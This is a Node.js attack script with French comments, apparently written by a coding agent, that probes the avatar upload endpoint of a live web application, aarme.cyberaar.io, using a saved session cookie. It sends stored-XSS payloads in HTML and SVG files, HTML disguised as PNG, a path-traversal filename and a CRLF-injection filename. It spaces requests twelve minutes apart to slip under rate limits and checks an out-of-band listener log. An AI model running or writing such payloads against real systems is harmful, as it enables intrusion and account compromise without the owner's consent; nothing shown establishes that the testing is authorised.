// CYBERAAR : runner espace — 1 POST par hypothèse toutes les 12 min (le plafond des formulaires
// est long ; je ne dois NI le marteler NI le réarmer). Chaque test est independant et journalise.
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.existsSync("/tmp/opencode/cyberaar/session-alias.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-alias.txt", "utf8").trim() : (fs.existsSync("/tmp/opencode/cyberaar/session-cookie.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim() : "");
const TUN = fs.existsSync("/tmp/opencode/cyberaar/tunnel-url.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/tunnel-url.txt", "utf8").trim() : "";
const LOG = "/tmp/opencode/cyberaar/spaced.log";
const { appendFileSync, writeFileSync } = await import("node:fs");
const note = (s) => { console.log(s); try { appendFileSync(LOG, s + "\n"); } catch {} };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000000200015a2d4a0000000049454e44ae426082", "hex");

async function postJSON(path, body, extra = {}) {
  const t0 = Date.now();
  const r = await fetch(APP + path, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/", Cookie: COOKIE, ...extra }, body: JSON.stringify(body), redirect: "manual", signal: AbortSignal.timeout(25000) });
  const t = await r.text();
  return { s: r.status, ms: Date.now() - t0, txt: t };
}
async function postFile(path, filename, type, content) {
  const fd = new FormData();
  fd.append("file", new Blob([content], { type }), filename);
  const t0 = Date.now();
  const r = await fetch(APP + path, { method: "POST", headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE }, body: fd, redirect: "manual", signal: AbortSignal.timeout(25000) });
  const t = await r.text();
  return { s: r.status, ms: Date.now() - t0, txt: t };
}

const QUEUE = [
  ["AVATAR-1 : PNG valide (controle)", async () => postFile("/api/aarme/account/avatar", "photo.png", "image/png", PNG)],
  ["AVATAR-2 : HTML type text/html (XSS stockee ?)", async () => postFile("/api/aarme/account/avatar", "x.html", "text/html", Buffer.from("<html><body><script>alert(document.domain)</script>PING-AVATAR</body></html>"))],
  ["AVATAR-3 : HTML deguise en image/png", async () => postFile("/api/aarme/account/avatar", "x.png", "image/png", Buffer.from("<html><body><script>alert(1)</script>PING-PNG</body></html>"))],
  ["AVATAR-4 : SVG (XSS)", async () => postFile("/api/aarme/account/avatar", "x.svg", "image/svg+xml", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'))],
  ["AVATAR-5 : nom en traversee de chemin", async () => postFile("/api/aarme/account/avatar", "../../../../tmp/evil.png", "image/png", PNG)],
  ["AVATAR-6 : nom avec CRLF", async () => postFile("/api/aarme/account/avatar", "a\r\nX-Injected: 1.png", "image/png", PNG)],
];
const GAP = 12 * 60 * 1000;
note("=== runner espace demarre (" + QUEUE.length + " tests, 1 toutes les " + GAP / 60000 + " min) ===");
for (const [lbl, fn] of QUEUE) {
  let r = { s: 0, txt: "ERR" };
  for (let attempt = 0; attempt < 12; attempt++) {
    try { r = await fn(); } catch (e) { r = { s: 0, txt: "ERR " + e.message }; }
    if (r.s !== 429) break;
    note("  [" + lbl + "] encore plafonne (429) -> nouvelle tentative dans 12 min");
    await sleep(GAP);
  }
  note(`[${new Date().toISOString()}] ${lbl} : HTTP ${r.s} ${String(r.ms || 0).padStart(5)}ms ${String(r.txt).replace(/\s+/g, " ").slice(0, 300)}`);
  if (lbl.startsWith("SSRF")) {
    try { const l = fs.readFileSync("/tmp/opencode/cyberaar/probe-listener.log", "utf8").trim().split("\n").slice(-4); note("  OOB : " + l.join(" | ")); } catch {}
  }
  await sleep(GAP);
}
note("=== runner espace termine ===");
